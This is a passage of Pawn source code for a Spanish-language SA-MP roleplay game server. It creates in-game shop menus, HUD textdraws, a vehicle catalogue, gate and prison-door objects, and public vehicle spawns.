	CreateDynamic3DTextLabel("Azotea", NaranjaOscuro, 2524.9102,-1280.7483,1048.2891, 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1); //Prisión-azotea

    for(new x=0; x<sizeof(Mostradores); x++)
    {
    	CreateDynamic3DTextLabel("'/Comprar' o H",0xb0b0b0FF,Mostradores[x][0],Mostradores[x][1],Mostradores[x][2], 1, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1);
	}
	
	restaurantes = CreateMenu("Restaurante", 2, 50.0, 180.0, 200.0, 200.0); //Menú restaurantes
	AddMenuItem(restaurantes, 0, "Botella de cerveza");
	AddMenuItem(restaurantes, 1, "15$");
	AddMenuItem(restaurantes, 0, "Copa de vino");
	AddMenuItem(restaurantes, 1, "15$");
    AddMenuItem(restaurantes, 0, "Vaso de whisky");
	AddMenuItem(restaurantes, 1, "15$");
	AddMenuItem(restaurantes, 0, "Vaso de ron");
	AddMenuItem(restaurantes, 1, "15$");
	AddMenuItem(restaurantes, 0, "Salir");

	bares = CreateMenu("Bar", 2, 50.0, 180.0, 200.0, 200.0); //Menú bares
	AddMenuItem(bares, 0, "Botella de cerveza");
	AddMenuItem(bares, 1, "15$");
	AddMenuItem(bares, 0, "Botella de agua");
	AddMenuItem(bares, 1, "10$");
	AddMenuItem(bares, 0, "Lata de fanta");
	AddMenuItem(bares, 1, "13$");
	AddMenuItem(bares, 0, "Lata de sprunk");
	AddMenuItem(bares, 1, "13$");
	AddMenuItem(bares, 0, "Copa de vino");
	AddMenuItem(bares, 1, "15$");
    AddMenuItem(bares, 0, "Vaso de whisky");
	AddMenuItem(bares, 1, "15$");
	AddMenuItem(bares, 0, "Vaso de ron");
	AddMenuItem(bares, 1, "15$");
	AddMenuItem(bares, 0, "Salir");

	comidasrapidas = CreateMenu("Menú", 2, 50.0, 180.0, 200.0, 200.0); //Menú comidas rápidas
	AddMenuItem(comidasrapidas, 0, "Lata de sprunk");
	AddMenuItem(comidasrapidas, 1, "13$");
	AddMenuItem(comidasrapidas, 0, "Lata de fanta");
	AddMenuItem(comidasrapidas, 1, "13$");
	AddMenuItem(comidasrapidas, 0, "Botella de agua");
	AddMenuItem(comidasrapidas, 1, "10$");
	AddMenuItem(comidasrapidas, 0, "Hamburguesa");
	AddMenuItem(comidasrapidas, 1, "20$");
	AddMenuItem(comidasrapidas, 0, "Burrito");
	AddMenuItem(comidasrapidas, 1, "20$");
	AddMenuItem(comidasrapidas, 0, "Pizza");
	AddMenuItem(comidasrapidas, 1, "30$");
	AddMenuItem(comidasrapidas, 0, "Salir");

	discoteca = CreateMenu("Menú", 2, 50.0, 180.0, 200.0, 200.0); //Menú clubs y discotecas
	AddMenuItem(discoteca, 0, "Lata de sprunk");
	AddMenuItem(discoteca, 1, "13$");
	AddMenuItem(discoteca, 0, "Lata de fanta");
	AddMenuItem(discoteca, 1, "13$");
    AddMenuItem(discoteca, 0, "Vaso de whisky");
	AddMenuItem(discoteca, 1, "15$");
	AddMenuItem(discoteca, 0, "Vaso de ron");
	AddMenuItem(discoteca, 1, "15$");
	AddMenuItem(discoteca, 0, "Salir");

	puticlub = CreateMenu("Menú", 2, 50.0, 180.0, 200.0, 200.0); //Menú puticlubs
	AddMenuItem(puticlub, 0, "Botella de cerveza");
	AddMenuItem(puticlub, 1, "15$");
    AddMenuItem(puticlub, 0, "Vaso de whisky");
	AddMenuItem(puticlub, 1, "15$");
	AddMenuItem(puticlub, 0, "Vaso de ron");
	AddMenuItem(puticlub, 1, "15$");
	AddMenuItem(puticlub, 0, "Salir");

	ammunation = CreateMenu("Tienda de armas", 2, 50.0, 180.0, 200.0, 200.0); //Menú ammunations
	AddMenuItem(ammunation, 0, "M1911");
	AddMenuItem(ammunation, 1, "2100$");
    AddMenuItem(ammunation, 0, "Cargador M1911");
	AddMenuItem(ammunation, 1, "300$");
	AddMenuItem(ammunation, 0, "Balas 45. ACP");
	AddMenuItem(ammunation, 1, "1000$");
	AddMenuItem(ammunation, 0, "Remington 870");
	AddMenuItem(ammunation, 1, "4800$");
	AddMenuItem(ammunation, 0, "Cartuchos 12GA");
	AddMenuItem(ammunation, 1, "800$");
	AddMenuItem(ammunation, 0, "Remington 700");
	AddMenuItem(ammunation, 1, "6200$");
	AddMenuItem(ammunation, 0, "Cargador Remington 700");
	AddMenuItem(ammunation, 1, "500$");
	AddMenuItem(ammunation, 0, "Balas 7.62x51mm");
	AddMenuItem(ammunation, 1, "700$");
	AddMenuItem(ammunation, 0, "Salir");

	menu247 = CreateMenu("24/7", 2, 50.0, 180.0, 200.0, 200.0); //Menú tienda 24/7
	AddMenuItem(menu247, 0, "Bolsa de doritos");
	AddMenuItem(menu247, 1, "20$");
	AddMenuItem(menu247, 0, "Bolsa de patatas");
	AddMenuItem(menu247, 1, "20$");
	AddMenuItem(menu247, 0, "Bolsa de nachos");
	AddMenuItem(menu247, 1, "20$");
	AddMenuItem(menu247, 0, "Lata de sprunk");
	AddMenuItem(menu247, 1, "13$");
	AddMenuItem(menu247, 0, "Lata de fanta");
	AddMenuItem(menu247, 1, "13$");
	AddMenuItem(menu247, 0, "Botella de agua");
	AddMenuItem(menu247, 1, "10$");
	AddMenuItem(menu247, 0, "Botella de cerveza");
	AddMenuItem(menu247, 1, "15$");
	AddMenuItem(menu247, 0, "Salir");

	tiendadeportes = CreateMenu("Tienda deportiva", 2, 50.0, 180.0, 200.0, 200.0); //Menú tienda de deportes
	AddMenuItem(tiendadeportes, 0, "Bate");
	AddMenuItem(tiendadeportes, 1, "50$");
	AddMenuItem(tiendadeportes, 0, "Palo de golf");
	AddMenuItem(tiendadeportes, 1, "70$");
	AddMenuItem(tiendadeportes, 0, "Palo de billar");
	AddMenuItem(tiendadeportes, 1, "60$");
	AddMenuItem(tiendadeportes, 0, "Salir");

	ferreteria = CreateMenu("Ferretería", 2, 50.0, 180.0, 200.0, 200.0); //Menú ferretería
	AddMenuItem(ferreteria, 0, "Palanca");
	AddMenuItem(ferreteria, 1, "100$");
	AddMenuItem(ferreteria, 0, "Cuchillo");
	AddMenuItem(ferreteria, 1, "100$");
	AddMenuItem(ferreteria, 0, "Destornillador");
	AddMenuItem(ferreteria, 1, "20$");
	AddMenuItem(ferreteria, 0, "Extintor");
	AddMenuItem(ferreteria, 1, "300$");
	AddMenuItem(ferreteria, 0, "Spray");
	AddMenuItem(ferreteria, 1, "150$");
	AddMenuItem(ferreteria, 0, "Pala");
	AddMenuItem(ferreteria, 1, "60$");
	AddMenuItem(ferreteria, 0, "Salir");

	tiendaropa = CreateMenu("Tienda de ropa", 2, 50.0, 180.0, 200.0, 200.0); //Menú tiendas de ropa
	AddMenuItem(tiendaropa, 0, "Skin");
	AddMenuItem(tiendaropa, 1, "100$");
	AddMenuItem(tiendaropa, 0, "Salir");

	electronica = CreateMenu("Tienda de electrónica", 2, 50.0, 180.0, 200.0, 200.0); //Menú tienda electrónica
	AddMenuItem(electronica, 0, "Movil");
	AddMenuItem(electronica, 1, "400$");
	AddMenuItem(electronica, 0, "Camara");
	AddMenuItem(electronica, 1, "40$");
	AddMenuItem(electronica, 0, "Reloj casio digital");
	AddMenuItem(electronica, 1, "40$");
	AddMenuItem(electronica, 0, "Salir");

	estanco = CreateMenu("Estanco", 2, 50.0, 180.0, 200.0, 200.0); //Menú estanco
	AddMenuItem(estanco, 0, "Cigarrillos");
	AddMenuItem(estanco, 1, "20$");
	AddMenuItem(estanco, 0, "Mechero");
	AddMenuItem(estanco, 1, "15$");
	AddMenuItem(estanco, 0, "Salir");

	licoreria = CreateMenu("Licoreria", 2, 50.0, 180.0, 200.0, 200.0); //Menú licoreria
	AddMenuItem(licoreria, 0, "Botella Whisky");
	AddMenuItem(licoreria, 1, "30$");
	AddMenuItem(licoreria, 0, "Botella Ron");
	AddMenuItem(licoreria, 1, "30$");
	AddMenuItem(licoreria, 0, "Botella cerveza");
	AddMenuItem(licoreria, 1, "20$");
	AddMenuItem(licoreria, 0, "Salir");
	
    for(new i; i < sizeof(Cajeros); i++) //Cajeros
	{
		CreateDynamic3DTextLabel("/ATM o F", VerdeOscuro, Cajeros[i][cX], Cajeros[i][cY], Cajeros[i][cZ] + 0.5, 10);
	}
	
	for(new i; i < sizeof(Jobs); i++) //Jobs
	{
		CreateDynamicPickup(1274, 23, Jobs[i][Jx], Jobs[i][Jy], Jobs[i][Jz]);
		format(string, 128, "Oferta de %s", Jobs[i][JobNombre]);
		CreateDynamic3DTextLabel(string, Amarillo, Jobs[i][Jx], Jobs[i][Jy], Jobs[i][Jz] + 0.4, 15);
		CreateDynamic3DTextLabel("/trabajo", Gris, Jobs[i][Jx], Jobs[i][Jy], Jobs[i][Jz], 15);
	}
	
	for(new i; i < sizeof(Concesionarios); i++) //Concesionarios
	{
		CreateDynamicPickup(1239, 23, Concesionarios[i][cX], Concesionarios[i][cY], Concesionarios[i][cZ]);
		format(string, 128, "Concesionario %s", Concesionarios[i][cNombre]);
		CreateDynamic3DTextLabel(string, Amarillo, Concesionarios[i][cX], Concesionarios[i][cY], Concesionarios[i][cZ] + 0.1, 30);
		CreateDynamic3DTextLabel("/comprarveh - /catalogo", Gris, Concesionarios[i][cX], Concesionarios[i][cY], Concesionarios[i][cZ], 30);
	}

    for(new i=0; i < MAX_CAR_DATA; i++) //Catalogo
	{
		format(string, sizeof(string), "Vehiculo: %s", datacar[i][dcNombre]);
		CocheNombre[i] = TextDrawCreate(240.000000,342.000000,string);
    	format(string, sizeof(string), "Precio: %d$", datacar[i][dcPrecio]);
		Costo[i] = TextDrawCreate(241.000000,356.000000,string);
		format(string, sizeof(string), "Id: %d Nivel: %d", i, datacar[i][dcNivel]);
		Id[i] = TextDrawCreate(240.000000,369.000000,string);
		Modelo[i] = TextDrawCreate(240.000000, 120.000000,"");
		
		TextDrawAlignment(CocheNombre[i],0);
		TextDrawAlignment(Costo[i],0);
		TextDrawAlignment(Id[i],0);
		TextDrawAlignment(Modelo[i], 2);
		
		TextDrawBackgroundColor(CocheNombre[i],0x000000ff);
		TextDrawBackgroundColor(Costo[i],0x000000ff);
		TextDrawBackgroundColor(Id[i],0x000000ff);
		TextDrawBackgroundColor(Modelo[i], 0x778899ff);
		
		TextDrawFont(CocheNombre[i],2);
		TextDrawLetterSize(CocheNombre[i],0.499999,1.100000);
		TextDrawFont(Costo[i],2);
		TextDrawLetterSize(Costo[i],0.499999,1.100000);
		TextDrawFont(Id[i],2);
		TextDrawLetterSize(Id[i],0.499999,1.300000);
		TextDrawFont(Modelo[i], 5);
		TextDrawLetterSize(Modelo[i], 0.000000, -0.000000);
		
		TextDrawColor(CocheNombre[i],0xffffffff);
		TextDrawColor(Costo[i],0x00ff0066);
		TextDrawColor(Id[i],0xffffffff);
		TextDrawColor(Modelo[i], 0xffffffff);
		
		TextDrawSetOutline(CocheNombre[i],1);
		TextDrawSetOutline(Costo[i],1);
		TextDrawSetOutline(Id[i],1);
		TextDrawSetOutline(Modelo[i], 0);
		
		TextDrawSetProportional(CocheNombre[i],1);
		TextDrawSetProportional(Costo[i],1);
		TextDrawSetProportional(Id[i],1);
		TextDrawSetProportional(Modelo[i], 1);
		
		TextDrawSetShadow(CocheNombre[i],1);
		TextDrawSetShadow(Costo[i],1);
		TextDrawSetShadow(Id[i],1);
		TextDrawSetShadow(Modelo[i], 1);
		
		TextDrawUseBox(Modelo[i], 1);
		TextDrawBoxColor(Modelo[i], 0x00000000);
		TextDrawTextSize(Modelo[i], 220.000000, 220.000000);
		TextDrawSetPreviewModel(Modelo[i], datacar[i][dcIDModel]);
		TextDrawSetPreviewRot(Modelo[i], -16.000000, 0.000000, -55.000000, 0.90);
		TextDrawSetSelectable(Modelo[i], 0);
	}
	
	fila1 = TextDrawCreate(238.000, 113.500, "LD_DUAL:black"); //Catálogo
    TextDrawFont(fila1, 4);
    TextDrawTextSize(fila1, 225.000, 7.000);
    TextDrawColor(fila1, -1);
    fila2 = TextDrawCreate(238.000, 334.000, "LD_DUAL:black");
    TextDrawFont(fila2, 4);
    TextDrawTextSize(fila2, 225.000, 7.000);
    TextDrawColor(fila2, -1);
    fila3 = TextDrawCreate(240.000, 114.000, "LD_DUAL:black");
    TextDrawFont(fila3, 4);
    TextDrawTextSize(fila3, -7.000, 227.000);
    TextDrawColor(fila3, -1);
    fila4 = TextDrawCreate(467.000, 114.000, "LD_DUAL:black");
    TextDrawFont(fila4, 4);
    TextDrawTextSize(fila4, -7.000, 227.000);
    TextDrawColor(fila4, -1);
    
    for(new i=0; i<MAX_PLAYERS; i++) //Velocímetro
    {
        box[i] = TextDrawCreate(618,389,"_");
		TextDrawLetterSize(box[i],0.5,3.999996);
		TextDrawUseBox(box[i],1);
		TextDrawBoxColor(box[i],0x00000060);
		TextDrawTextSize(box[i],473,0);
		vvel[i] = TextDrawCreate(478,389,"_");
		TextDrawLetterSize(vvel[i],0.37,1.099999);
		TextDrawSetOutline(vvel[i],1);
		fuel[i] = TextDrawCreate(478,413,"_");
		TextDrawLetterSize(fuel[i],0.37,1.099999);
		TextDrawSetOutline(fuel[i],1);
    }
    
    for(new i; i < sizeof(AutoEscuelas); i++) //Autoescuelas
	{
		CreateDynamicPickup(1239, 23, AutoEscuelas[i][AutoX], AutoEscuelas[i][AutoY], AutoEscuelas[i][AutoZ]);
		format(string, 50, "%s", AutoEscuelas[i][AutoNombre]);
		CreateDynamic3DTextLabel(string, Amarillo, AutoEscuelas[i][AutoX], AutoEscuelas[i][AutoY], AutoEscuelas[i][AutoZ] + 0.5, 30);
		CreateDynamic3DTextLabel("/Examen", Gris, AutoEscuelas[i][AutoX], AutoEscuelas[i][AutoY], AutoEscuelas[i][AutoZ], 30);
	}
    
    Foro = TextDrawCreate(485.000000, 435.000000, "www.Nexus-RP.es"); //Foro-prueba de identidad-anti fraude cheat
	TextDrawBackgroundColor(Foro, 255);
	TextDrawFont(Foro, 1);
	TextDrawLetterSize(Foro, 0.400000, 1.000000);
	TextDrawColor(Foro, -1);
	TextDrawSetOutline(Foro, 1);
	TextDrawSetProportional(Foro, 1);
	TextDrawSetSelectable(Foro, 0);
	
	for(new i=0; i < MAX_PLAYERS; i++)
	{
		hambre[i] = TextDrawCreate(500.000000, 100.000000, "hud:radar_dateFood"); //Tenedor hambre
		TextDrawBackgroundColor(hambre[i], 255);
		TextDrawFont(hambre[i], 4);
		TextDrawLetterSize(hambre[i], 0.500000, 1.000000);
		TextDrawColor(hambre[i], -1);
		TextDrawSetOutline(hambre[i], 1);
		TextDrawSetProportional(hambre[i], 0);
		TextDrawUseBox(hambre[i], 1);
		TextDrawBoxColor(hambre[i], 255);
		TextDrawTextSize(hambre[i], 15.000000, 15.000000);

		sed[i] = TextDrawCreate(500.000000, 116.000000, "hud:radar_dateDrink"); //Copa sed
		TextDrawBackgroundColor(sed[i], 255);
		TextDrawFont(sed[i], 4);
		TextDrawLetterSize(sed[i], 0.500000, 1.000000);
		TextDrawColor(sed[i], -1);
		TextDrawSetOutline(sed[i], 1);
		TextDrawSetProportional(sed[i], 0);
		TextDrawUseBox(sed[i], 1);
		TextDrawBoxColor(sed[i], 255);
		TextDrawTextSize(sed[i], 15.000000, 15.000000);
	}
	
	//Objetos móviles
	lspdpuerta1 = CreateDynamicObject(968,1544.6999500,-1630.8000500,13.3000000,0.0000000,90.0000000,90.0000000); //object(barrierturn) (1)
	lspdpuerta2 = CreateDynamicObject(975,1589.0595700,-1638.1992200,14.0300000,0.0000000,0.0000000,0.0000000); //object(columbiangate) (1)
	lspdpuerta3 = CreateDynamicObject(3089,1582.6169400,-1637.9000200,13.5400000,0.0000000,0.0000000,0.0000000); //object(ab_casdorlok) (1)
	lspdpuerta4 = CreateDynamicObject(2930,213.8999900,124.9300000,1000.6500200,0.0000000,0.0000000,90.0000000); //object(chinatgate) (2)
	lspdpuerta5 = CreateDynamicObject(3089,253.1992200,109.8193400,1003.5000000,0.0000000,0.0000000,270.0000000); //object(ab_casdorlok) (1)
	lspdpuerta6 = CreateDynamicObject(3089,239.5996100,118.3496100,1003.5000000,0.0000000,0.0000000,270.0000000); //object(ab_casdorlok) (1)
	lspdpuerta7 = CreateDynamicObject(2930,258.89999390,91.50000000,1004.09997559,0.00000000,0.00000000,0.00000000); //object(chinatgate) (3)
	Celda1 = CreateDynamicObject(19303, 266.25, 78.46, 1001.29, 0.00, 0.00, 90.00);
	Celda2 = CreateDynamicObject(19303, 266.25, 82.95, 1001.29, 0.00, 0.00, 90.00);
	Celda3 = CreateDynamicObject(19303, 266.25, 87.46, 1001.29, 0.00, 0.00, 90.00);
	lspddeposito = CreateDynamicObject(980,1620.6500244,-1861.5996094,15.3000002,0.0000000,0.0000000,179.9945068); //object(airportgate) (3)
	puertaprision = CreateDynamicObject(2930,2527.2000000,-1294.1300000,1049.9000000,0.0000000,0.0000000,90.0000000); //object(chinatgate) (2)
	puertaprision2 = CreateDynamicObject(2930,2531.7000000,-1283.8740000,1049.9000000,0.0000000,0.0000000,90.0000000); //object(chinatgate) (2)
	
	puertaceldaprision1 = CreateDynamicObject(1495,2555.7200000,-1304.1000000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (1)
	puertaceldaprision2 = CreateDynamicObject(1495,2559.6199000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (2)
	puertaceldaprision3 = CreateDynamicObject(1495,2551.8210000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (3)
	puertaceldaprision4 = CreateDynamicObject(1495,2547.9224000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (5)
	puertaceldaprision5 = CreateDynamicObject(1495,2544.0237000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (6)
	puertaceldaprision6 = CreateDynamicObject(1495,2540.1243000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (7)
	puertaceldaprision7 = CreateDynamicObject(1495,2536.2253000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (8)
	puertaceldaprision8 = CreateDynamicObject(1495,2532.3264000,-1304.0996000,1043.1000000,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (9)
	puertaceldaprision9 = CreateDynamicObject(1495,2561.6799300,-1283.6899400,1043.0999800,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (10)
	puertaceldaprision10 = CreateDynamicObject(1495,2557.7798000,-1283.6895000,1043.1000000,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (11)
	puertaceldaprision11 = CreateDynamicObject(1495,2553.8799000,-1283.6895000,1043.1000000,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (12)
	puertaceldaprision12 = CreateDynamicObject(1495,2549.9800000,-1283.6895000,1043.1000000,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (13)
	puertaceldaprision13 = CreateDynamicObject(1495,2546.0798000,-1283.6895000,1043.1000000,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (14)
	puertaceldaprision14 = CreateDynamicObject(1495,2542.1799000,-1283.6895000,1043.1000000,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (15)
	puertaceldaprision15 = CreateDynamicObject(1495,2538.2798000,-1283.6895000,1043.1000000,0.0000000,0.0000000,180.0000000); //object(gen_doorext01) (16)
	
	puertapatioprision = CreateDynamicObject(971,2571.3999000,-1304.8300000,1043.0000000,0.0000000,0.0000000,90.0000000); //object(subwaygate) (1)

	LSNpuerta1 = CreateDynamicObject(969,781.8000000,-1384.8000000,12.7000000,0.0000000,0.0000000,180.2500000); //object(electricgate) (3)
	LSNpuerta2 = CreateDynamicObject(969,781.8000000,-1330.3000000,12.7000000,0.0000000,0.0000000,178.7470000); //object(electricgate) (5)
	PressBancaBarraObjeto[0] = CreateObject(2913, barbell_pos[ 0 ][ 0 ], barbell_pos[ 0 ][ 1 ], barbell_pos[ 0 ][ 2 ], barbell_pos[ 0 ][ 3 ], barbell_pos[ 0 ][ 4 ], barbell_pos[ 0 ][ 5 ] );
	PressBancaBarraObjeto[1] = CreateObject(2913, barbell_pos[ 1 ][ 0 ], barbell_pos[ 1 ][ 1 ], barbell_pos[ 1 ][ 2 ], barbell_pos[ 1 ][ 3 ], barbell_pos[ 1 ][ 4 ], barbell_pos[ 1 ][ 5 ] );
	PressBancaBarraObjeto[2] = CreateObject(2913, barbell_pos[ 2 ][ 0 ], barbell_pos[ 2 ][ 1 ], barbell_pos[ 2 ][ 2 ], barbell_pos[ 2 ][ 3 ], barbell_pos[ 2 ][ 4 ], barbell_pos[ 2 ][ 5 ] );
	
	//Cambios de materiales de objetos
	cristal1 = CreateObject(19325, 239.76820, 112.93750, 1005.29999,   0.00000, 0.00000, 0.00000);
	cristal2 = CreateObject(19325, 252.99770, 117.04010, 1005.29999,   0.00000, 0.00000, 0.00000);
	cristal3 = CreateObject(19325, 239.38820, 112.93750, 1005.29999,   0.00000, 0.00000, 0.00000);
	cristal4 = CreateObject(19325, 253.35770, 117.04010, 1005.29999,   0.00000, 0.00000, 0.00000);
	cristal5 = CreateObject(19325, 249.66161, 119.21840, 1005.29999,   0.00000, 0.00000, 90.00000);
	cristal6 = CreateObject(19325, 243.02161, 119.21840, 1005.29999,   0.00000, 0.00000, 90.00000);
	cristal7 = CreateObject(19325, 243.00160, 119.47840, 1005.29999,   0.00000, 0.00000, 90.00000);
	cristal8 = CreateObject(19325, 249.64160, 119.47840, 1005.29999,   0.00000, 0.00000, 90.00000);
	SetObjectMaterial(cristal1, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal2, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal3, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal4, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal5, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal6, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal7, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	SetObjectMaterial(cristal8, 0, 19341, "egg_texts", "easter_egg01", 0x00FFFFFF);
	
	//INICIO VEHÍCULOS PUBLICOS//
    //======LSPD======//
    AddStaticVehicleEx(427,-1583.839100000,749.419600000,-5.110300000,180.00000000,0,1,3600); //Enforcer 
    AddStaticVehicleEx(427,-1587.963900000,749.419600000,-5.110300000,180.00000000,0,1,3600); //Enforcer 
    AddStaticVehicleEx(427,-1592.269500000,749.419600000,-5.103500000,180.00000000,0,1,3600); //Enforcer - 
    AddStaticVehicleEx(601,-1573.21190000,742.46300000,-5.48360000,90.00000000,0,1,3600); //S.W.A.T. Van 
    AddStaticVehicleEx(601,-1573.21190000,738.59180000,-5.48340000,90.00000000,0,1,3600); //S.W.A.T. Van  5
    AddStaticVehicleEx(490,-1572.4979,710.2267,-5.1159,90.0000,0,0,3600); //FBI Rancher 
    AddStaticVehicleEx(490,-1572.4979,706.0075,-5.1159,90.0000,0,0,3600); //FBI Rancher 
    AddStaticVehicleEx(490,-1572.4979,714.2833,-5.1159,90.0000,0,0,3600); //FBI Rancher 
    AddStaticVehicleEx(516,-1616.3041,732.1787,-5.4081,0.0000,9,9,3600); //Nebula 
    AddStaticVehicleEx(496,-1612.4601,732.0684,-5.5265,0.0000,3,4,3600); //Blista  10
    AddStaticVehicleEx(467,-1616.4700,749.4939,-5.5019,180.0000,1,6,3600); //Oceanic 
    AddStaticVehicleEx(402,-1604.3485,749.9977,-5.4718,180.0000,0,0,3600); //Buffalo
    AddStaticVehicleEx(415,-1608.4899,749.9977,-5.4716,180.0000,0,0,3600); //Cheetah 
    AddStaticVehicleEx(426,-1612.1938,749.1891,-5.4173,180.0000,0,0, 3600); //Premier
    AddStaticVehicleEx(596,1545.54943848,-1651.02917480,5.71062469,90.00000000,0,0,3600); //Police Car (LSPD) 15
    AddStaticVehicleEx(596,1545.54943848,-1655.07836914,5.71062469,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(596,1545.54943848,-1659.02734375,5.71062469,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(596,1545.54943848,-1663.03979492,5.71062469,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(596,1545.54943848,-1667.89807129,5.71062469,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(596,1545.54943848,-1671.97827148,5.71062469,90.00000000,0,1,3600); //Police Car (LSPD) 20
    AddStaticVehicleEx(596,1545.54943848,-1676.07922363,5.71062469,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(596,1545.54943848,-1684.37084961,5.74014664,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(596,1545.54943848,-1680.22387695,5.74014664,90.00000000,0,1,3600); //Police Car (LSPD)
    AddStaticVehicleEx(523,1557.4336,-1710.5233,5.4525,0.00000000,0,1,3600); //HPV1000
    AddStaticVehicleEx(523,1559.8743,-1710.5233,5.4525,0.00000000,0,1,3600); //HPV1000 25
    AddStaticVehicleEx(523,1562.3150,-1710.5233,5.4525,0.00000000,0,1,3600); //HPV1000
    AddStaticVehicleEx(523,1564.7557,-1710.5233,5.4525,0.00000000,0,1,3600); //HPV1000
    AddStaticVehicleEx(523,1567.1964,-1710.5233,5.4525,0.00000000,0,1,3600); //HPV1000
    AddStaticVehicleEx(523,1569.6371,-1710.5233,5.4525,0.00000000,0,1,3600); //HPV1000
    AddStaticVehicleEx(497,1566.50000000,-1708.06005859,28.70000076,90.00000000,0,1,3600); //Police Maverick 30
    AddStaticVehicleEx(497,1569.69995117,-1652.80004883,28.70000076,0.00000000,0,1,3600); //Police Maverick
    AddStaticVehicleEx(487,1566.4906,-1694.0710,28.6254,90.00000000,0,0,3600); //Maverick
    AddStaticVehicleEx(497,612.1329,-603.9223,22.8830,180.00000000,0,1,3600); //Police Maverick
    AddStaticVehicleEx(598,1526.49572754,-1643.98303223,6.27575159,180.00000000,0,1,3600); //LVPD
    AddStaticVehicleEx(598,1530.46606445,-1643.98303223,6.27575159,180.00000000,0,1,3600); //LVPD 35
    AddStaticVehicleEx(598,1534.69177246,-1643.98303223,6.27575159,180.00000000,0,1,3600); //LVPD
    AddStaticVehicleEx(598,1538.71667480,-1643.98303223,6.27575159,180.00000000,0,1,3600); //LVPD
    AddStaticVehicleEx(525,1591.4323,-1711.0713,5.7688,0.00000000,0,1,3600); //Tow Truck
    AddStaticVehicleEx(525,1595.4498,-1711.0713,5.7680,0.00000000,0,1,3600); //Tow Truck
    AddStaticVehicleEx(497,2280.2578,73.9502,35.1907,180.00000000,0,1,3600); //Police Maverick 40
    AddStaticVehicleEx(430,2493.2432,-2268.2346,0.0000,90.000000,0,1,3600); //Predator
    AddStaticVehicleEx(430,2529.6113,-2268.2346,0.0000,90.000000,0,1,3600); //Predator
    AddStaticVehicleEx(473,2511.42725,-2267.2346,0.0000,90.000000,1,1,3600); //Dinghy
    AddStaticVehicleEx(430,2114.0967,-103.7018,-0.1933,120.5044,0,1,3600); //Predator -
    AddStaticVehicleEx(599,1602.6211,-1691.9659,6.0790,90.00000000,0,1,3600); //Police Ranger 45
    AddStaticVehicleEx(599,1602.6211,-1687.8544,6.1430,90.00000000,0,1,3600); //Police Ranger
    AddStaticVehicleEx(599,1602.6211,-1683.9187,6.1060,90.00000000,0,1,3600); //Police Ranger
    AddStaticVehicleEx(599,1602.6211,-1696.0380,6.1060,90.00000000,0,1,3600); //Police Ranger
    AddStaticVehicleEx(597,1528.7050,-1688.0760,5.6593,270.00000000,1,1,3600); //SFPD
    AddStaticVehicleEx(597,1528.7050,-1683.9211,5.6593,270.00000000,1,1,3600); //SFPD 50
    //======GOB======//
    AddStaticVehicleEx(409,1520.9000200,-1829.8000500,13.5000000,180.0000000,1,1,3600); //Stretch
    AddStaticVehicleEx(421,1526.1999500,-1829.3000500,13.5000000,180.0000000,40,40,3600); //Washington
    AddStaticVehicleEx(487,1421.6412400,-1789.4536100,33.6946900,0.0000000,1,1,3600); //Maverick
    AddStaticVehicleEx(533,1532.0999800,-1829.5000000,13.3000000,180.0000000,13,13,3600); //Feltzer 54
    //======LSN======//
	AddStaticVehicleEx(582,736.3016357,-1350.6542969,13.6686020,270.0000000,116,1,3600); //Newsvan
	AddStaticVehicleEx(582,736.3227539,-1345.6693115,13.6686020,270.0000000,116,1,3600); //Newsvan
	AddStaticVehicleEx(488,741.9565430,-1373.2150879,25.9572105,0.0000000,-1,-1,3600); //News Chopper 57
    //======Permiso conducción======//
    AddStaticVehicleEx(401,2052.5447,-1903.7300,13.3264,180.0000000,1,1,600); //Bravura
    AddStaticVehicleEx(401,2055.9919,-1903.7300,13.3264,180.0000000,1,1,600); //Bravura
    AddStaticVehicleEx(401,2059.4391,-1903.7300,13.3264,180.0000000,1,1,600); //Bravura 60
    //======Permiso aviación======//
    AddStaticVehicleEx(593,1991.5916,-2286.5642,14.0084,90.0000000,0,0,600); //Dodo 61
    //======Permiso navegación======//
    AddStaticVehicleEx(473,2944.3000000,-1561.9000000,0.0000000,260.0000000,1,1,600); //Dinghy 62
	//======Job barrendero======//
	AddStaticVehicleEx(574,1622.69995117,-1896.09997559,13.30000019,0.00000000,1,-1,600); //Sweeper
	AddStaticVehicleEx(574,1619.09997559,-1896.09997559,13.30000019,0.00000000,1,-1,600); //Sweeper
	AddStaticVehicleEx(574,1612.30004883,-1896.09997559,13.30000019,270.00000000,1,-1,600); //Sweeper
